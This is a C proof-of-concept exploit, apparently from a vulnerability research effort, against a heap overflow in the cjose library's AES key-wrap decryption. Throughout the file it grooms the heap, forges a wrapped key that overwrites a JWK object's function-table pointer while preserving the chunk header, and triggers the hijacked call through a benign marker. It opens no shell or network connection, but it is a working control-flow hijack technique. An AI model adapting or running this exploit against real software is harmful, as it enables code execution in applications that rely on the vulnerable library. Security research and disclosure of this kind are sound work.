/*
 * cjose2shell W188: controlled function-pointer overwrite through the
 * AES-KW CEK heap overflow, direct call into the pinned real library.
 *
 * Grooming: allocate a 32-byte hole, then the real OCT JWK, then free the
 * hole immediately before cjose_jwe_decrypt(); the vulnerable CEK malloc reuses
 * the hole, so the JWK is the next heap chunk and its fns pointer sits inside
 * the attacker-written CEK tail. The wrapped plaintext carries the original
 * JWK fields plus a chosen fns pointer to a lab fake table whose free_func is
 * a benign marker. cjose_jwk_release() then calls the marker.
 *
 * Plain builds only: ASan aborts on the first OOB store before the pointer
 * write completes. No socket, server, wire listener, shell or credential.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <cjose/cjose.h>
#include <cjose/base64.h>
#include <cjose/error.h>
#include <openssl/aes.h>
#include "include/jwe_int.h"
#include "include/jwk_int.h"

static const char *JWK_OCT_16 = "{\"kty\":\"oct\", "
                                "\"k\":\"3921VrO5TrLvPQ-NFLlghQ\"}";
static const unsigned char KEK[16] = {
    0xdf, 0xdd, 0xb5, 0x56, 0xb3, 0xb9, 0x4e, 0xb2,
    0xef, 0x3d, 0x0f, 0x8d, 0x14, 0xb9, 0x60, 0x85
};
#define CEK_LEN 32

static volatile int marker_called = 0;
static void marker(cjose_jwk_t *jwk)
{
    (void)jwk;
    marker_called = 1;
    printf("BENIGN_MARKER_EXECUTED\n");
}
static key_fntable fake_fntable = { marker, NULL, NULL };

static void put64(uint8_t *p, uint64_t v)
{
    for (int i = 0; i < 8; i++) p[i] = (uint8_t)(v >> (8 * i));
}
static void put32(uint8_t *p, uint32_t v)
{
    for (int i = 0; i < 4; i++) p[i] = (uint8_t)(v >> (8 * i));
}

/* Wrap a chosen plaintext under the lab KEK; caller supplies raw_len-8 bytes. */
static char *wrap_blob(const uint8_t *pt, size_t pt_len)
{
    cjose_err err;
    memset(&err, 0, sizeof(err));
    uint8_t blob[1024];
    AES_KEY wkey;
    AES_set_encrypt_key(KEK, 128, &wkey);
    if (pt_len + 8 > sizeof(blob)) return NULL;
    if (AES_wrap_key(&wkey, NULL, blob, pt, pt_len) <= 0) return NULL;
    char *b64 = NULL;
    size_t b64_len = 0;
    if (!cjose_base64url_encode(blob, pt_len + 8, &b64, &b64_len, &err)) return NULL;
    return b64;
}

static char *tamper(const char *compact, char *b64)
{
    const char *d1 = strchr(compact, '.');
    const char *d2 = d1 ? strchr(d1 + 1, '.') : NULL;
    if (!d2) return NULL;
    size_t head = (size_t)(d1 - compact);
    size_t tail = strlen(d2);
    char *out = (char *)malloc(head + 1 + strlen(b64) + tail + 1);
    if (!out) return NULL;
    memcpy(out, compact, head);
    out[head] = '.';
    memcpy(out + head + 1, b64, strlen(b64));
    memcpy(out + head + 1 + strlen(b64), d2, tail);
    out[head + 1 + strlen(b64) + tail] = '\0';
    return out;
}

int main(int argc, char **argv)
{
    const char *scenario = (argc > 1) ? argv[1] : "fptr";
    if (strcmp(scenario, "fptr") && strcmp(scenario, "fptrsafe")) {
        printf("BAD_SCENARIO=%s\n", scenario);
        return 2;
    }
    setbuf(stdout, NULL);

    cjose_err err;
    memset(&err, 0, sizeof(err));

    /* Groom: hole, then the real JWK in the following chunk. */
    void *hole = malloc(CEK_LEN);
    if (!hole) return 2;
    cjose_jwk_t *jwk = cjose_jwk_import(JWK_OCT_16, strlen(JWK_OCT_16), &err);
    if (!jwk) { printf("JWK_FAIL=%d\n", err.code); return 2; }
    printf("HOLE=%p JWK=%p DELTA=%ld\n", hole, (void *)jwk, (long)((char *)jwk - (char *)hole));

    cjose_header_t *hdr = cjose_header_new(&err);
    cjose_header_set(hdr, CJOSE_HDR_ALG, CJOSE_HDR_ALG_A128KW, &err);
    cjose_header_set(hdr, CJOSE_HDR_ENC, CJOSE_HDR_ENC_A128CBC_HS256, &err);
    const char *plain = "Setec Astronomy";
    cjose_jwe_t *good = cjose_jwe_encrypt(jwk, hdr, (const uint8_t *)plain, strlen(plain), &err);
    char *compact = cjose_jwe_export(good, &err);
    if (!good || !compact) { printf("ENCRYPT_FAIL=%d\n", err.code); return 2; }
    char *token = (char *)compact;
    if (!strcmp(scenario, "fptr")) {
        long delta = (char *)jwk - (char *)hole;
        size_t pt_len = (size_t)(delta + 48);   /* ends just after jwk->fns */
        if (pt_len % 8) pt_len += 8 - pt_len % 8;
        uint64_t jwk_prev_size = *(uint64_t *)((char *)jwk - 16);
        uint64_t jwk_chunk_size = *(uint64_t *)((char *)jwk - 8);
        uint8_t *pt = calloc(1, pt_len);
        memset(pt, 0x41, pt_len);
        uint8_t *q = pt + (size_t)delta;         /* JWK object base in CEK coordinates */
        put64(q - 16, jwk_prev_size);            /* preserve JWK chunk header */
        put64(q - 8, jwk_chunk_size);
        put32(q + 0x00, 3);                      /* kty OCT */
        put64(q + 0x08, 0);                      /* kid = NULL */
        put32(q + 0x10, 1);                      /* retained = 1 */
        put64(q + 0x18, 128);                    /* keysize */
        put64(q + 0x20, (uint64_t)(uintptr_t)jwk->keydata); /* keydata (preserve) */
        put64(q + 0x28, (uint64_t)(uintptr_t)&fake_fntable); /* fns -> fake table */
        char *b64 = wrap_blob(pt, pt_len);
        free(pt);
        if (!b64) { printf("WRAP_FAIL\n"); return 2; }
        token = tamper(compact, b64);
        cjose_get_dealloc()(b64);
        printf("PT_LEN=%zu RAW_EK=%zu FAKE_FNS=%p JWK_CHUNK_SIZE=%#lx\n",
               pt_len, pt_len + 8, (void *)&fake_fntable, (unsigned long)jwk_chunk_size);
    }
    if (!token) { printf("TAMPER_FAIL\n"); return 2; }

    cjose_jwe_t *jwe = cjose_jwe_import(token, strlen(token), &err);
    if (!jwe) { printf("IMPORT_FAIL=%d\n", err.code); return 3; }

    /* Free the hole last: tcache hands it to the vulnerable CEK malloc. */
    free(hole);
    size_t plain_len = 0;
    uint8_t *dec = cjose_jwe_decrypt(jwe, jwk, &plain_len, &err);

    printf("DECRYPT=%d ERRCODE=%d CEK=%p GROOM_OK=%d CEK_LEN_AFTER=%zu\n",
           dec != NULL, err.code, (void *)jwe->cek, jwe->cek == hole, jwe->cek_len);
    printf("JWK_FNS_NOW=%p ORIGINAL_FNS=%p\n",
           (void *)jwk->fns, (void *)&fake_fntable);

    if (dec) cjose_get_dealloc()(dec);
    printf("PRE_RELEASE retained=%u kid=%p keydata=%p fns=%p free_func=%p marker=%p\n",
           jwk->retained, (void *)jwk->kid, (void *)jwk->keydata,
           (void *)jwk->fns, (void *)jwk->fns->free_func, (void *)marker);
    cjose_jwk_release(jwk);       /* calls jwk->fns->free_func(jwk) */
    printf("MARKER_CALLED=%d\n", marker_called);
    /* No cjose_jwe_release(): the 768-byte write also corrupts unrelated live
     * JWE objects, so teardown faults after the observation. OS reclaims on exit. */

    if (token != compact) free(token);
    cjose_get_dealloc()(compact);
    cjose_header_release(hdr);
    cjose_jwe_release(good);
    return 0;
}
